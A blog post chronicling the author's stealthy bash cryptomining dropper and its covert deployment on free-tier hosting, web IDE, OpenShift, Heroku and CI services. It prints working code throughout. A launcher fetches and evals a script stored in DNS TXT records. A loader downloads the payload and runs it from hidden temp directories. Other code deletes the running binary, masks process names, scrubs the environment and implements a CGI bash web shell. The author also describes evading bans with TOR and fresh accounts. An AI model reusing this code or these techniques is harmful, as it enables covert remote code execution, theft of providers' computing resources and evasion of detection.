+++
date = "03/28/2021"
title = "Chronicles of a cryptonote dropper"
tags = ["crypto", "net", "shell"]
rss_description = "...How far are you willing to go for...pennies?"
+++

Assume you want to mine [cryptocurrencies] on remote _virtual_ hardware. You need to find something to mine. Remote servers means, no [ASICS] or GPU proof of work algorithms, basically only [CPU friendly coins].

## The software

Search and find a [miner], but it is not really nice, you would like something you can better control from remote, so you find [another miner]. You also want a [proxy], because many connections will be short lived, you don't want to [dos] your mining pool. Also a [tunnel] would be nice.

## The design

Some botnets use blockchains data to lookup commands, [somebody] also appears to have [lost bets] on this not happening again...anyway we are not that sophisticated, we will get by with some DNS records that store a script that pulls the payload which self extract in a temp directory executes and leaves _almost_ no traces of its setup.
Here is a small flow chart which depicts the structure

\input{plot}{../../payload.jl}

## Launcher

The point of a startup script is to be accessible and easily updatable such that it withstands the test of time.
Updating [DNS] records is easy, and DNS is the last thing that gets shutdown within a network..because IP addresses are hard to remember...so chances are it is going to be available most of the times. You see when we are _fetching the deployment script_ we are actually already running some logic, this is the launcher script, it needs the ability to perform DNS queries to lookup our records, DNS might be ubiquitous but [dig] is not.

There is a little bit of a conundrum here, if we have to download another tool _to download another script to download the payload_ we should just download the payload! In defense...doing this scripty dance adds to obfuscation, allows to keep only one implementation of the launcher (maintainability, yay), isn't required most of the times..so we also service a [statically linked] dig executable to perform dns queries, fetched either by self hosting, or cloud hosting (yes there are fallbacks, like 3 or 4, because cloud services have very minimal free bandwidth, and also require cookies or access tokens...they are very script unfriendly, purposefully so , of course).

What's in the dns records? We are using [TXT] records, on a custom domain (fallbacks here too). Why TXT? they happen to be the ones that can store the largest amount of data..usually since it is kind of [recommended] depending on _things_.
We are specifically using [cloudflare] for our DNS fiddling since it is free, and pretty much the only player in town (_well not really but any other alternative pales features wise_). It happens that you can store multiple pieces of data on the _same_ record...this starts getting confusing and scramble for some specifications...(tangent) Cloudflare [used to] allow _chained_ TXT records totaling ~9k bytes, docs now state ~2k bytes, prior to the change I was using ~6k I think, and was serving the script uncompressed, after that I had to thin out the script and compress it before hand (actually I tried to use a [freedns] provider, I was banned within one day, guessing they have a strict no-fat TXT records policy), however gzip compression appears to NOT be pipe friendly and was still causing problems, so I had to manage to cram the script in without compression (end tangent).

How do we store it? TXT records only support alphanumeric strings, no [NULs], so we have to wrap it into a non null encoding, [base64] satisfies this constraint, and because we are storing _chained_ TXT records, we have to chunk the output, since we are using shell stuff, this is done through the `-w` flag, on busybox such flag used to be absent (or opt-in) on older versions which was annoying, an alternative is to use the encoder bundled with openssl, `openssl enc -base64`.

Now that we know how to store our deployment script we store it with either [cf cli] or manually. How do we pull it? We mentioned that we need bindutils or our own `dig`...after having chosen the serving endpoint, we want to download it, what is available is usually [wget] or [curl], wget is found preinstalled much more often, however busybox only provides tls support with dynamic libraries, so you have to make sure the endpoint is serving http or your utility is `wget` from gnu-utils

```bash
# the wget command
wget -t 2 -T 10 -q -i- -O- > $filename <<< "$digurl"
```

It means try `-t2` times waiting `-T10` seconds being `-q` quiet reading from `-i-` stdin (`$digurl`) and writing to `-O-` stdout (`$filename`). This command does not reveal what we are downloading on a first glance. We are going to be very careful with other shell commands for the same reason, or sticking with shell ([bash]) built-ins where possible. Take also care about where you are downloading your executables, you want to ensure you can execute them, since some mount points, especially in containers and `tmp` paths are `noexec`.
Now that we have our dns querying tool we fetch our records

```bash
dig txt ${record}.${zone} +short +tcp +timeout=3 +retries=0 $dnsserver
```

Flags are self explanatory here, `+short` just means that we are only interested in the data itself, so that we don't have to parse the output. It's important to specify the DNS server, like google (`8.8.8.8`) or cloudflare (`1.1.1.1`) ones because many environments redirect or proxy dns queries to their own dns servers by default.
After having fetched the chunked script we deal with quotes and whitespaces to make it ready for decoding

```bash
data=${data//\"} # remove quotes
data=${data// } # remove whitespace
declare -a ar_data
for l in $data; do
    ar_data[${l:0:1}]=${l:1} # iterate over each line and remove the first characther
done
data=${ar_data[@]} # join all the lines
data=${data// } # ensure joining didn't add whitespace
# decode
launcher=$(echo "$launcher" | $b64 -d -w $chunksize)
```

What if now we _still_ don't have our launcher? DNS is messy, we want a fallback, lets setup a subdomain to fetch the launcher script directly.
Before evaluating our script we want to customize it, with some variables, again lets use a TXT record to store a NAME=VALUE list of variables and parse it. There is also a fallback for variables, cloudflare offers redirects based on URLs, these redirects are served _before_ the destination, so we don't need an endpoint, we just want to configure regex based redirect rules to a fictitious endpoint, what we are interested in are the parameters of the url `?NAME=VALUE&NAME2=VALUE2...`, so that we can parametrize our launcher simply by changing the redirect url, always with attention to quoting and escapes codes

```bash
## m1 also important to stop wget
pl_vars=$(echo "$token_url" | wget -t 1 -T 3 -q -i- -S 2>&1 | grep -m1 'Location')
pl_vars=${pl_vars#*\/}
pl_vars=${pl_vars//\"&/\" }
pl_vars=${pl_vars//%3F/\?}
```

The wget `-S` prints the redirect url we are interested in for parsing.
Having the parameters and the script, we evaluate the variables writing them over a file

```bash
eval "$pl_vars"
echo "export \
$pl_vars \
$ENV_VARS \
">env.sh
```

This file will be sourced by are deploy script.
The last part of the startup script is to actual [trampoline], evaluate the script within the current shell process, or maybe let it be managed by tmux if possible.

```bash
# printf preserves quotes
eval "$(printf '%s' "$launcher")" &>/dev/null
# or tmux
echo "$launcher" > ".. "
tmux send-keys -t miner ". ./\".. \"" Enter
```

The launcher script is dumped to a file named ".. " this looks confusing because it can be mistaken as a _parent_ directory. And we don't include the session command, as that would linger in the process command, instead we start the tmux session beforehand and send the source command through tmux terminal interface. Related to this, sometimes calling an executable with `./` keeps those chars in the command, so it is better to add the `$PWD` to the path..`PATH=$PWD:$PATH`.

## The Payload

Our deploy script starts by sourcing the `env.sh` file, and keeping or configured vars as `STARTING_*` vars like

```bash
STARTING_PATH=${STARTING_PATH:-$PATH}
STARTING_PID=$BASHPID
```

This allows us to kill and restart a running instance while resetting the environment.
Lets switch to a tmp directory with exec capabilities

```bash
# out local subdirectory
pathname=$(printf ".%-$((RANDOM%9+1))s"
for ph in {/tmp,/dev/shm,/run,/var/tmp,/var/cache,~/.local,~/.cache,~/}; do
    rm -rf "$ph/$pathname" &&
        mkdir -p "$ph/$pathname" &&
        tmppath="$ph/$pathname" &&
        is_path_executable "$tmppath" &&
        export PATH="${ph}/$pathname:${PATH}" tmppath &&
        break
done
[ -n "$tmppath" ] && cd "$tmppath"
```

Checking if within a [container] is also handy, we can probe the filesystem for hints

```bash
c=$(builtin compgen -G '/etc/cpa*')
d=$(builtin compgen -G '/dev/*')
s=$(builtin compgen -G '/sys/*')
p=$(builtin compgen -G '/proc/*')
jail=
if [ -n "$c" -o -z "$d" -o -z "$s" -o -z "$p" ]; then ## we are in a jail
    jail=1
fi
```

Now it's time to download our payload, we choose to support both wget and curl, we already know how to use wget with careful flags, for curl it is a little bit different. We have to create a config file, and override `CURL_HOME`

```bash
echo "url = $uri
output = ${name}${format}
connect-timeout = 10
" > .curlrc
CURL_HOME=$PWD curl -sOL
```

Last step is just to extract the payload

```bash
type unzip &>/dev/null &&
    format=".zip" extract="unzip -q" ||
        format=".tar.gz" extract="tar xf"
```

It is worth mentioning the use of a [CDN] for servicing the payload. Here again cloudflare to the rescue saves us from bandwidth expenditures. By simply renaming our compressed payload with a _file extension_ supported by cloudflare...it becomes cached. Cloudflare doesn't check the headers of what it is servicing, maybe because doing so at that scale is simply impractical.

## Adventures down Bashland

Bash was chosen with the assumption that is portable, doesn't look too out of place and is more ubiquitous compared to other scripting languages such perl, ruby or python. The truth is that a standalone binary written in golang or lua would have been much easier, with less bugs, and easier to maintain, basically bash was the worst choice possible, in my defense, by the time that I scratched so many itches with bash, it was too late for a rewrite, and it was also getting kind of boring.

There was also the option to use busybox with the compile time flag to use all builtins (like grep and sed), however using builtins this way doesn't allow to spawn jobs (fork) and exposes the daemon to potential deadlocks.

I will describe some bash functions here, with the full list available [here]

```bash
## echo a string long $1 of random lowercase chars
rand_string() {
    local c=0
    while [ $c -lt $1 ]; do
        printf "\x$(printf '%x' $((97+RANDOM%25)))"
        c=$((c+1))
    done
}
```

Use the `RANDOM` variable to get a number between 97-122 corresponding to a character code, printf should be a builtin, we don't want to fork within a loop.

```bash
## make a new file descriptor named $1
newfd() {
    eval "local fd=\${$1}"
    eval "exec $fd>&-" &>/dev/null
    local pp=".$(rand_string 8)"
    mkfifo $pp
    unset "$1"
    eval "exec {$1}<>$pp"
    # unlink the named pipe
    rm -f $pp
}
```

Leverage pipes to create anonymous file descriptors, these don't behave exactly like file descriptors but they are good enough for [IPC].

```bash
## https://unix.stackexchange.com/a/407383/163931
fleep()
{
    # log "fleep: called by ${FUNCNAME[1]}"
    [ -n "${_snore_fd}" -a "$1" != 0 ] ||
        newfd _snore_fd
    # log "fleep: starting waiting with ${_snore_fd}"
    if ! command >&${_snore_fd}; then
        newfd _snore_fd
    fi
    read -t ${1:-1} -u $_snore_fd
    # log "fleep: ended"
}
```

Sleeping without forking, by abusing the timeout functionality of the read builtin, it uses a dedicated file descriptor and we must ensure that it is available to avoid termination.

There are functions like `get_pid_stats`, `usgmon_prc`, `proc_usg_u`, `cpumon`, `loadmon` are used to monitor system usage, these all make use of the linux `/proc` files without tools like `ps`, so no forking, all pure bash.

```bash
start_coproc() {
    local unset
    while :; do
        if [ "$1" = exec ]; then
            coproc_name="$2"
        else
            coproc_name="$1"
        fi

        if [ -n "$UNSET_COPROC_VARS" ]; then
            unset="unset $UNSET_COPROC_VARS;"
        fi

        log "starting coproc $coproc_name"
        unset -v "$coproc_name" ## only the variable, not functions
        eval "coproc $coproc_name { $unset $*; }" # 2>/dev/null
        unset UNSET_COPROC_VARS
        wait_coproc "$coproc_name" 3 && break
    done
}
stop_coproc() {
    ## clear fds
    id_coproc "$1" && [ -n "$job_n" ] && eval "kill -${2:-9} %$job_n" ||
        { eval "kill -${2:-9} \${${1}_PID}"; } ||
        { log "could not kill the specified coprocess with job $job_n" && return 1; }
}
```

Coprocesses are available since bash `v4`, they are like jobs except they have a name and their own file descriptors.

```bash
## clear file descriptors
clear_fds() {
    local fd
    for fd in $(compgen -G "/proc/$BASHPID/fd/*"); do
        fd=${fd/*\/}
            if [[ ! " $* " =~ " ${fd} " ]]; then
                case "$fd" in
                    0|1|2|255|"$_snore_fd")
                    ;;
                    *)
                        eval "exec $fd>&-"
                        ;;
                esac
            fi
    done
}
```

We are writing a daemon, which is a long lived process, and we are using many file descriptors, we really want to do some cleanups to avoid incurring in [ulimits].

```bash
## queries ipinfo and gets the current ip and country/region
parse_ip ()
{
    export ip country region;
    [ ! -e cfg/geoip.json ] && log "geolocation codes file not found." && return 1;
    ipquery=$(http_req ipinfo.io);
    [ -z "$ipquery" ] && log "failed querying ipinfo" && return 1;
    before_after 'ip\": \"' "$ipquery" '\"';
    ip=$(echo $after);
    [ -z "$ip" ] && log "failed parsing ipinfo data ip" && return 1;
    before_after 'country\": \"' "$ipquery" '\"';
    country=$(echo ${after,,});
    [ -z "$country" ] && log "failed parsing ipinfo data country" && return 1;
    while read l; do
        if [ "${l}" != "${l/\": {}" ]; then
            before_after '"' "$l" '"';
            lastregion=$(echo $after);
        else
            if [ "${l}" != "${l/\"${country}\"}" ]; then
                region=$lastregion;
                break;
            fi;
        fi;
    done < cfg/geoip.json
}
```

This function relies on [ipinfo] to determine the region of the worker, which allows to tune some region dependent logic, [geoip.json] groups countries into regions, since we want the top level region, and are not interested in the specific country.

```bash
# try to open a connection to host $1 with port $2 and output to $3
open_connection() {
    exec {socket}<>/dev/tcp/${1}/${2} 2>/dev/null
    echo $socket >&${3}
}

## check if a tcp connection to $1=$HOST $2=$PORT is successful
check_connection() {
    local host=$1 port=$2 conn_socket=
    [ -z "$host" ] && { echo 'no host provided'; return 1; }
    [ -z "$port" ] && { echo 'no port provided'; return 1; }
    newfd conn_socket
    timeout 3 open_connection $host $port $conn_socket
    # read the fd of the opened connection from the conn_socket fd and close it
    read_fd $conn_socket avl -
    if [ -n "$avl" ]; then
        # close connection
        eval "exec ${avl}<&-" &>/dev/null
        return 0 ## connection can be established
    else
        return 1 ## connection can't be established
    fi
}
```

Bash has support for tcp connections, by having an abstraction over `/dev/tcp` (also for udp, but most it seems to be usually disabled at build time, so you can't rely on it). These files are a bash thing, they are not part of the linux `/dev` tree.

Worth mentioning also a locking system to handle concurrency between bash jobs. To allow multiple jobs to work with locks they all need to share a file descriptor, so our `locker` which is also a job, has to be started before other jobs wishing to use the lock. The locker simply reads on `stdin` waiting for locking requests, responding on `stdout` depending on the current boolean state stored in a variable. I don't guarantee that this approach is race free, but seems to work decently, on the other hand, I have found file descriptors to not be very reliable, as I suspect there are some buffers that do not get flushed somewhere down the _pipes_ and eventually hitting deadlocks (which means that you cannot rely on the locker giving you an answer all the times).

```bash
## unset bash env apart excluded vars/funcs
clear_env(){
    local functions=$(declare -F)
    functions=${functions//declare -f }
    for u in $@; do
        functions=${functions/$u[[:space:]]}
        functions=${functions/[[:space:]]$u}
        functions=${functions/[[:space:]]$u[[:space:]]}
    done
    local vars=$(set -o posix; set | while read l; do echo ${l/=*}; done)
    for u in $@; do
        vars=${vars/$u[[:space:]]}
        vars=${vars/[[:space]]$u}
        vars=${vars/[[:space:]]$u[[:space:]]}
    done
    unset -f $functions &>/dev/null
    unset -v $vars &>/dev/null
    # unset $vars &>/dev/null
}

## unexport most variables
dex_env() {
    exported=$(export -p)
    while read e; do
        n=${e/declare -*x }
        [ "$n" = "$e" ] && continue ## multiline var
        n=${n/=*}
        case "$n" in
            "SHELL"|"USER"|"HOME"|"TMUX"|"CHARSET"|"TERM")
                continue
                ;;
            *)
                dexported="$dexported ${n/=*}"
        esac
    done <<<"$exported"
    export -n $dexported
}
```

Clean up your garbage...complex bash programs end up using many variables, and if you abuse the global space it gets bloaty. If you are spawning shell jobs, they inherit all the environment (which is effectively duplicated, not shared), you can quickly end up with bash eating `100M` of memory, not nice.
Also we really want to be low profile. In our deployment scenario, the adversary [^adversary] can potentially have root access and complete information about our processes [^infoproc] , and you know...every process holds information about the full command that started it, and the exported environment variables.

## Configuration

Once we have our environment, and our tools, we have to tune our miner for the machine it is running on, configuration steps in pseudo code:

- process name for the miner
- host infos (ram/cores/caches/`ENV_VARS`)
- configuration version
- `worker_id` for the miner (from ip and host)
- ip/port for the connection

Choosing a name for the process is required to _hide_ the fact that we are running a miner, but we are not just renaming our binary, we have a list of **masks** for potential candidates (a plain text file where each line is a mask):

- pick a mask at random
- shuffle the elements of the tail of the string (all except the first) to get a diverse process command.
  Now we have a string looking like `cmd --arg2 --arg1 --arg3`. This is our miner mask, we run the binary _without_ arguments, but it looks like we started a command `cmd` with arguments `--arg1 --arg2 --arg3`. Spaces and dashes are allowed in file names, so it is fine to run a binary named like this, it doesn't seem linux discerns between the executable and the arguments when storing the process commands.

  The miner configuration is automatically loaded from `$PWD`.

### Hashrate

, with time, the upstream miner got many **automatic tuning** features, so it made part of my scripts redundant, but the difference between upstream and downstream here is that the upstream goal is to maximize _performance_, while our goal is to maximize _efficiency and obfuscation_, we do not want to overtake the system, we want to leech a little bit without service disruption. [^monerominer]

For this, we need a more granular understanding of the environment, the `l2/l3` cache structure of the processor, ram, and cores, and current processor _average_ load and cpu _usage_. I attempted to build a [state machine] in bash that would start from the bare minimum and try different configurations slowly settling on the average best. It was a **huge** waste of effort littered with [technical debt] that went bankrupt very quickly and was mostly discarded, with just remnants lingering in the codebase.

Frack all this auto tuning jumbo, we just made the miner sleep depending on host usage/load, this required miner modifications to `sleep` between threads yields, and a few fixes to the configuration watchdog [^configwatch], which would allow us to reload the sleeping amount at runtime. The logic is much more simplified and looks like this:

- if usage is above/below \$TARGET_USAGE (± margin of error) increase/decrease sleep
- if average load within `1m` is above/below \$TARGET_LOAD pause/resume mining

### Connection

In our bash roundup we showed utilities for connection. Why do we need these? Because we need diversity; simply hard coding an endpoint into the configuration won't last long, when something looks suspicious, and has network activity, IPs are flagged.

At the start we experimented with a couple of methods:

- using [proxychains] to overload the miner network calls, but it required the miner to be built with dinamic libraries, and you had to ship them with the payload, so it was impractical.
- running a [forward tunnel] side by side with the miner: this had a lot of configuration overhead, as now we were configuring two processes on each deployment, which amounted to more bugs.

At the end we settled with just shipping a list of endpoints, stored in an bash variables, picking one at random. Connections were of course encrypted.
What are these endpoints? Forwarders to the proxy which would handle the miners jobs.

```julia:miner
#hideall
using Kroki
miner = """
@startuml

control miner
rectangle endpoint [
endpoint
]
rectangle proxy [
proxy
]
storage pool [
pool
]

miner <=> "forwards to proxy" endpoint
endpoint <=> "handle jobs" proxy
proxy <=> "submit shares" pool
@enduml
"""
dg = Kroki.Diagram(:PlantUML, miner)
open(joinpath(@OUTPUT, "miner.png"), "w+") do f
    show(f, "image/png", dg)
end

```

\fig{miner}

Why do we need a [mining proxy]? I never really went past ~100 concurrent connections, so a proxy was not really necessary for network load, but it was convenient for negotiating the hashing algorithm, and to provide different difficulty targets to different miners, to prevent miners from working on **difficulty** targets that would take them too much time to complete and avoid the risk of wasting computation on unfinished jobs. [^difficulty]
The pool software also required a few modifications as it was happily advertising to be a proxy on plain http requests..._that had to be timed-out_, and a fork added access control so we based our mods on that. [^stratumprotocol]

### Editing json

Applying modifications to a json file with just bash we got by with some env var substitution, and some regex.
Initially we were relying on an `envsubst` binary to apply variables, then we went full bash [^fullbash] with this logic:

- read config template
- replace all quotes with a very esoteric string (like `_#_#`)
- `eval` the template
- replace all the esoteric occurrences back with quotes

Apart from avoiding sub processes, another advantage is that we get complete bash capabilities in our templates.
For reading and writing without templates, we have to rely on bash regex capabilities:

```bash
cc_rgx='( *".*?" *: *)("(.*?)"|([^,]*?)) *(,|.*?\/\/.*?|\n|$)'
change_config() {
	local subs
	while read l; do
		if [ "${l}" != "${l/\"*$1*\"*:/}" ]; then
			[[ "${l}" =~ $cc_rgx ]]
			matches=("${BASH_REMATCH[@]}")
			[ -n "${matches[3]}" -a "${2:0:1}" != "\"" ] &&
				subs="\"$2\"" ||
				subs="$2"
			CONFIG=${CONFIG/${matches[0]}/${matches[1]}$subs${matches[5]}}
			break
		fi
	done <<<"$(printf '%s' "$CONFIG" 2>/dev/null)"
}

## output miner config value $1 unquoted
gc_rgx=' *"[^:]+" *: *("(.*?)"|([^,]*)) *(,|.*?\/\/.*?|\n|$)'
get_config() {
	while read l; do
		if [ "${l}" != "${l/\"*$1*\"*:/}" ]; then
			[[ "${l}" =~ $gc_rgx ]]
			[ -n "${BASH_REMATCH[2]}" ] &&
				printf '%s' "${BASH_REMATCH[2]}" ||
				printf '%s' "${BASH_REMATCH[3]}"
			break
		fi
	done <<<"$(printf '%s' "$CONFIG" 2>/dev/null)"
}
```

This only allows us to edit single lines, for multi-line entries it just considers the first line..but it is good enough for our use case.

## Runtime

What does our runtime look like? We have a main bash process that executes the main loop, then the miner sub-process, the cpu monitor sub-process, the locker and the tuner. That's almost a handful.

First we want to ensure that if something goes wrong, we don't leave a mess, this means that we use a bash trap
to perform cleanups on termination

```bash
trap "trap - SIGINT EXIT SIGKILL SIGTERM; kill -9 \$(jobs -p); cleanup &>/dev/null ; fleep 10" SIGINT EXIT SIGKILL SIGTERM
```

`trap - ...` unsets the trap to prevent recursion. The trap kills all the jobs and removes the working environment.

It's time to start the miner, which is stored as a bash variable in base64 encoding. We dump it on the filesystem, then we dump the config, execute the miner, and remove both the miner and the config. On linux you can remove the executable of a running process, (on windows this is not allowed). [^memoryondemand]
When the miner is running, on the filesystem there is just a `.. /` directory with a `b64` link in it.

```bash
## put a file $1 into a var $2
fileToVar(){
    declare -n tmpd="$2" && tmpd=$(b64e "$1") && return
    if [ -z "$tmpd" ]; then
        log "gobbling in array"
        eval "$2=1" ## avoid empty checks
        gobbled[$2]=$(b64e "$1")
    else
        return 1 ## do not quote assignment otherwise ram is not released
    fi
}
## put a var $1 into a file $2
varToFile(){
    if [ -n "$VERBOSE" ]; then
        if declare -n 2>>${VERBOSE} && eval "b64d <<<\"\$$1\" 1>\"$2\" 2>>${VERBOSE}"; then
            return
        else
            # log "dumping from array"
            eval "b64d <<<\"\${gobbled[$1]}\" 1>\"$2\" 2>>${VERBOSE}" && return
        fi
        return 1
    else if declare -n && eval "b64d <<<\"\$$1\" >\"$2\""; then
             return
         else
             # log "dumping from array"
             eval "b64d <<<\"\${gobbled[$1]}\" >\"$2\"" && return
         fi
         return 1
    fi
}
```

A maddening quirk encountered with bash while encoding the miner is that assigning a variable with a subshell with quotes `myvar="$(something)"` causes a permanent increase in memory usage, this was hard to debug and haven't really found the reason why behaves like this, anyway the assignment has to be unquoted.
Decoding instead is done with _herestrings_ which is an abstraction over temporary files, the variable is dumped into a file that is then piped back into the process.

The miner long running loop:

- while true
  - stop miner
  - remove config
  - start miner
  - while true
    - start daemon
      - while miner is running
        - read the output from miner
        - choose miner action based on output line
    - if miner is not running: break
  - sleep

The output line is matched against some regex:

```bash
act_rgx='(accepted|speed|paused|algo:|-> update config|-> publish config|-> trigger restart|\[CC\-Client\] error|Error: \"\[Connect\]|POOL #1:      \(null\))|not enough memory|self-test failed|read error|cpu  disabled'
```

The daemon handles cases where

- the connection to the endpoint gives errors (pick a new random endpoint)
- the hashing algorithm changes (adjust sleep time and ad-hoc configurations)
- miner problems (restart the miner).

For a while there was support for the command and control dashboard, which allowed to trigger manual restarts, however since its usage was minimal it was discarded, and its endpoints were replaced with an alternative pool connection, also the restart process was unstable, complex...another instance of tech debt. However it allowed to re-fetch an updated payload and re-setup all configurations on the fly, which was pretty cool, the ultimate trampoline.

## Debugging

There are three main utilities

- enable/disable tracing around code blocks (we don't want to trace a b64 encoded binary in a variable..)
- a simple function for formatting logs
- a flag that would activate verbose logging at runtime whenever the miner was started.
  - does the file `.debug` exist?
    - enable verbose logging

## Target deployments

This setup has been tested on 3 kind of hosts:

### Self hosted containers or VMs

Many hosting providers don't like mining since CPU resources tend to be shared among multiple users, and mining software can easily slow down a host node impacting performance for the rest of the users. This can true even if CPU user time is unlimited, because hashing algorithms can saturate all the caching layers of the CPU if the cache is shared among all the CPU cores.

We would like to use our _fair_ share of resources without getting banned, that's a good use-case for our stealth dropper since it is host usage aware, which means it _should_ stay kind of within [AUP]. There is no extra steps when dealing with self hosted deployments, just the launcher script, maybe added to the boot sequence or launched manually.

### cPanel based web hosting

Web hosting subscriptions plans are mostly offered through [cPanel]. Again here we are using personal subscription plans which have reasonable resource limits, on the other hand any free plan has ridiculous limits [^freehostinglimits].
cPanel allows you to define handlers for different file extensions, this allows us to execute shell scripts through the [cgi] with an http request against a shell script uploaded on the server. These kind of interfaces are what web-shells look like [^cpanelssh].
A simple bash web shell

```bash
# without content encoding the request response won't be honored
echo -e 'Content-Type: text/plain\n'
SERVER_NAME=myserver
## parse vars (for interactive use)
saveIFS=$IFS
IFS='=&'
parm=($QUERY_STRING)
IFS=$saveIFS
for ((i=0; i<${#parm[@]}; i+=2))
do
    declare var_${parm[i]}=${parm[i+1]}
done
## exec command for interactive and proclimited scenarios
url_encoded="${var_path//+/ }"
export PATH=".:$PATH"
. /dev/shm/srv/utils/load.env &>/dev/null

if declare -f "${url_encoded/\%20*}" 1>/dev/null; then ## don't use -n, redirect fd for bcompat
    printf '%b' "${url_encoded//%/\\x}" > /tmp/${SERVER_NAME}.src
else
    if builtin "${url_encoded/\%20*}"; then
        printf '%b' "${url_encoded//%/\\x}" > /tmp/${SERVER_NAME}.src
    else
        printf 'exec %b' "${url_encoded//%/\\x}" > /tmp/${SERVER_NAME}.src
    fi
fi
. /tmp/${SERVER_NAME}.src
```

It is better to only rely on builtins as forking additional processes may not be allowed in web jails, but it is always possible to `exec` which allows us to use most command line utilities. Most web shells are written in other scripting languages like python or php as you don't have to worry about forking.

In a cpanel environment it is better to use a static name for the miner process, like `httpd` or `php-fpm` because `cgi` is based on multi processing, so servers are always filled with many processes named like this, although a careful observer should notice the _multi-threaded_ usage pattern which is definitely not common (or possible) for languages such as perl, php, ruby, or python!

Processes have also a time limit by default, (1 hour, 1 day, etc..), for this we just use a cron job that restarts the dropper.

This required a lot of manual editing, the cpanel api to automate this is unfortunately not exposed to end users, so web hosting is a clunky and boring target for our miner dropper.

### Web environments

There are _SaaS_ providers that have a web editor coupled with a container, such as [cloud9] (with a free tier before getting acquired by amazon), [codeanywhere], [codenvy]. Deploying the dropper here is easy (you have a full fledged environment), but keeping it running is a burden, since any interactive web editor terminates its session soon after the web page is closed, and the container is consequently put to sleep (unless you pay of course).

Circumventing this can only mean that we have to keep the sessions open, some scripting with [puppeteer] achieved the desired result, but having long running, memory leaking, bloated SPAs web pages is definitely unattractive and not stealthy, because from the provider backend, a session opened 24/7 will definitely look suspicious. Indeed, web environments are also clunky and boring targets.

### Free apps services

This is mainly [openshift] (when it used to have a free tier) [^openshift] and [heroku]. Openshift, being kubernetes was somewhat straightforward to deploy, but full of configuration churn, here is an excerpt:

```sh
export PATH=.:$PATH

[ -z "$OC_PRJ" ] && { echo "no account data provided"; exit 1; }
obfs=~/utils/deploy/obfs.sh
[ -x $obfs ] ||
    { echo "obfs utility not found!"; exit 1; }
launcher=~/launcher
[ -f $launcher ] ||
    { echo "launcher script not found!"; exit 1; }

ctroot=${CT_ROOT_DIR:-oc-ct-box-mine}
## the service that starts the miner is named app in /etc/services.d in the rootfs
scriptpath="rootfs/etc/services.d/app/run"
TYPE=${HRK_TYPE:-worker}
IMG=$(oc-endpoint)/$OC_PRJ/$OC_APP
tspath=/tmp/oc-tmp-apprun
prepend="#!/usr/bin/with-contenv bash
"
## beware the newline ^^^

cd $ctroot || { echo "couldn't find ct build directory"; exit 1; }

VARS=$(cat vars) || { echo 'vars file empty!'; }
VARS=${VARS//$'\n'/ }
VARS=${VARS//\\/\\\\} ## preserve escapes
script=$(cat $launcher | tail +2 | sed -r '/^echo "export \\$/a '"$VARS"' \\')
cat <<< "$script" > $tspath
$obfs $tspath
[ -z "${tspath}.obfs" ] && { echo "obfs file not found?"; exit 1; }
cat <<< "$prepend$(cat "${tspath}.obfs")" > $scriptpath
exec itself (should eval)
chmod +x $scriptpath

docker build -t $IMG  . || exit 1
cd -
oc-push-image "$IMG"
```

This was the script used to build the mining container which required a yaml template:

```yaml
apiVersion: build.openshift.io/v1
kind: BuildConfig
metadata:
  labels:
    build: ${OC_APP}
  name: ${OC_APP}
spec:
  activeDeadlineSeconds: 5184000
  failedBuildsHistoryLimit: 0
  successfulBuildsHistoryLimit: 0
  resources:
    limits:
      cpu: 2
      memory: 1Gi
  runPolicy: Serial
  source:
    type: Binary
  strategy:
    sourceStrategy:
      from:
        kind: ImageStreamTag
        name: ${OC_APP}-build:latest
        namespace: ${OC_PRJ}
    type: Source
  template:
    activeDeadlineSeconds: 2400
  triggers:
    - generic:
        secretReference:
          name: ${OC_APP}
      type: Generic
```

But the whole process involved quite a lot of steps!

```sh
## init
[ -z "$OC_APP" ] && export $(<$(tfi))
[ -z "$OC_APP" ] && { . ./choose-creds || exit 1; }
oc-login
oc new-project $OC_PRJ || { [ -z "$(oc get projects)" ] && exit 1; }
oc new-app $OC_APP --allow-missing-images || exit 1

## build box with docker and push
# oc-docker-login || exit 1
oc-build-mine || exit 1

## create dc config
export OC_TEMPLATE_TYPE=mine
oc-box-template || exit 1
rtr=0
while [ $rtr -lt 10 ]; do
  oc rollout latest $OC_APP && break
  rtr=$((rtr+1))
  read -t 1
done
exit
## builds
bash -x oc-build-build || exit 1
bash -x oc-build-template || exit 1
oc start-build $OC_APP || exit 1

accounts=${ACCOUNTS_DIR:-accounts_queue}
mv $accounts/${OC_USR}{\.this,\.$(date +%s)}
```

In pseudo code:

- create the project
- create the application without an image
- build the mining container
- deploy the container with a deployment config (kubernetes abstraction)
- rollout the deployment

The `build-build` scripts instead created a _build_ container which would mine for a few hours at a time. Builds and normal pods have separate resources in openshift so we exploited both of them.
Openshift was overall a bad experience since it went over 4 different releases (maybe more, I stopped tracking after a while) and each of them required changes to the configurations, they had no upgrade paths and everything was quickly iterated over, and it was common for builds/pods to stall, and not being garbage collected...they usually ran manual restarts every once in a while, maybe kubernetes was just buggy :)

Heroku configuration was a little bit simpler (it doesn't involve kubernetes). Apart the container build, which was similar to the openshift one, the rest was just two cli commands

```bash
heroku config:set HRK_APP=$HRK_APP -a $HRK_APP
heroku container:release -a $HRK_APP $TYPE
```

The container was directly pushed with docker over to the heroku registry. [^herokucontainers]
The friction with heroku (which free tier is still standing up to the time of writing) is that dynos can only run for 22 days per month so they required some manual management each month, again clunky and boring. They did execute some ban waves at the beginning, and then they disabled registrations through TOR, I am quite sure I was the cause of this.

### CI containers or VMs

These were the most synergic targets for our dropper. There are many [CI] companies, many of which are burning investors money offering free tiers in the hope of collecting some market share in the tech infrastructure business.

All these services offer different resources, have different configurations requirements and run in different environments. I never considered automating account registration because those kind of things are dreadful to program, I try to avoid them all the time, so I just endured manual registrations for a while as I was curious to what kind of anti spam response I would get (and how different from the rest!). You can guess some things about the management of a company from how it handles spam:

- Does it perform ban waves? Then they have non strict policies, problems are handled manually and case by case
- Does it require phone verification? They were already abused in the past
- Do they respond to heavy resource usage? They are running on a tight budget
- Do they apply account restrictions or shadow bans? If they shadow ban, they have mean sysadmins.

There is also a philosophical question:
If a service allows you to abuse their system for a long time, does it mean that they have a top-of-the-shelf infrastructure capable of handling the load, or simply poor control over their system? And you must consider the balance between accessibility and security, a system too secure can lower user retention.

Here's a table showing some services that I deployed to:

\insert{./../_assets/posts/output/ciServicesTable.out}

In this context, a \color{green}{good} configuration means that it didn't take much time to configure a `ci` job for the mining process (like all services relying on a web dashboard instead of a repository dot-file were a chore), a \color{red}{bad} `ban-hammer` means that it was hard to register to the service, or that accounts would get banned more aggressively.

